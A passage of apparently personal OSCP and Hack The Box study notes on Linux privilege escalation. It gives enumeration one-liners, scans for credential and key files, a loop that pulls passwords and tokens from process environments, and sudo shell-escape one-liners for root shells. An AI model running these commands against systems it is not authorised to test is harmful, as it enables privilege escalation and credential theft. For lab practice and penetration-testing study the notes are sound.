ls -la /proc/*/fd/ 2>/dev/null | grep -E 'root|shadow|sudoers'
```

CVE-2019-18684 (sudo FD 3 write) is the classic example: writing to `/proc/PID/fd/3` during a sudo password prompt could inject a sudoers rule. The technique generalizes: look for any writable FD pointing to a root-owned file.

---

## Consolidated Enumeration One-Liners

```bash
# system
uname -a; uname -m; cat /etc/os-release; hostname -I; sudo -V | grep "Sudo ver"

# identity and groups
id; whoami; groups; w; last

# sudo and SUID
sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -6000 -type f 2>/dev/null
getcap -r / 2>/dev/null

# scheduled tasks
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs/ 2>/dev/null
systemctl list-timers --all
atq 2>/dev/null

# network
ss -tulpn; ip a; ip route; cat /etc/resolv.conf

# writable paths
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc

# interesting files
find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null
find / -name "id_rsa" -o -name "*.key" -o -name "*.pem" 2>/dev/null
find / -mmin -10 -type f 2>/dev/null

# linker / filesystem primitives
ls -la /etc/ld.so.preload /etc/passwd /etc/shadow /etc/logrotate.d 2>/dev/null

# ptrace / sudo token reuse
cat /proc/sys/kernel/yama/ptrace_scope

# NFS
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null

# container context
ls -la /.dockerenv 2>/dev/null
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock \) 2>/dev/null
capsh --print 2>/dev/null
runc --version 2>/dev/null

# D-Bus / sessions
busctl --system list 2>/dev/null
find /tmp /run -name 'screen.*' -o -name 'tmux-*' 2>/dev/null

# live process secrets
for pid in /proc/[0-9]*; do tr '\0' '\n' < "$pid/environ" 2>/dev/null | grep -iE 'pass|token|secret'; done

# 2026 page-cache LPE surface
cat /proc/crypto | grep -i aead
lsmod | grep -E 'xfrm|rxrpc'

# static SUID glibc surface
find / -perm -4000 -type f -exec sh -c 'ldd "$1" 2>&1 | grep -q "not a dynamic" && echo "$1"' _ {} \; 2>/dev/null

# polkit / AD-joined
pkexec --version 2>/dev/null
realm list 2>/dev/null
```

---

## Priority Quick Actions

On a fresh shell, run these in order after your standard enumeration — they are often faster than a kernel exploit:

```bash
# 1. Sudo token reuse precondition
cat /proc/sys/kernel/yama/ptrace_scope
last | head
grep sudo /var/log/auth.log | tail

# 2. Sudo CVE surface (chwoot)
sudo --version | head -1
sudo -l

# 3. Systemd exposure
find /etc/systemd/system -writable 2>/dev/null
systemctl list-timers --all

# 4. Linker / filesystem primitives
ls -la /etc/ld.so.preload /etc/passwd /etc/shadow /etc/logrotate.d 2>/dev/null
getcap -r / 2>/dev/null

# 5. Live-process secrets
for pid in /proc/[0-9]*; do tr '\0' '\n' < "$pid/environ" 2>/dev/null | grep -iE 'pass|token|secret'; done

# 6. at queue
atq 2>/dev/null
```

---

## Field Notes from the HTB List

- **Read the runas user in `sudo -l`.** `(scriptmanager : scriptmanager) NOPASSWD: ALL` needs `sudo -u scriptmanager /bin/bash`, not plain `sudo` (Bashed).
- **Unusual GTFOBins that are easy to miss:** `sudo wget --input-file /root/root.txt`, `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`, `sudo tar --checkpoint-action=exec=/bin/bash`, `sudo nginx -c /dev/shm/nginx.conf`, `sudo mosh-server` (then `MOSH_KEY=... mosh-client`), `sudo bee eval 'system("bash")'`, `sudo apport-cli` → pager → `!sh`, `sudo nano` → `^R^X`, `sudo vi` with a wildcard argument. (Sunday, Cozyhosting, Tartarsauce, Broker, UnderPass, Dog, Devvortex, OpenAdmin, Swagshop)
- **`ss -tnl` after landing.** Localhost-only panels are common: OliveTin 1337, Netdata 19999, motionEye 8765, VNC 5901, MySQL 3306. (Enigma, Editor, Cctv, Poison)
- **`hidepid=invisible`** makes `ps` look empty — do not conclude there are no processes; read `ss`, configs, and `/proc` (BoardLight, Cctv).
- **`NoNewPrivileges=true`** on a service unit blocks `su`/setuid from that context even with the correct password (Editor).
- **mtime deltas detect root jobs** you cannot read: `ls -la` the same file twice; a ticking `test.txt` is a cron tell (Bashed).

Full context: [HTB Linux machines](/notes/oscp-labs/linux/).
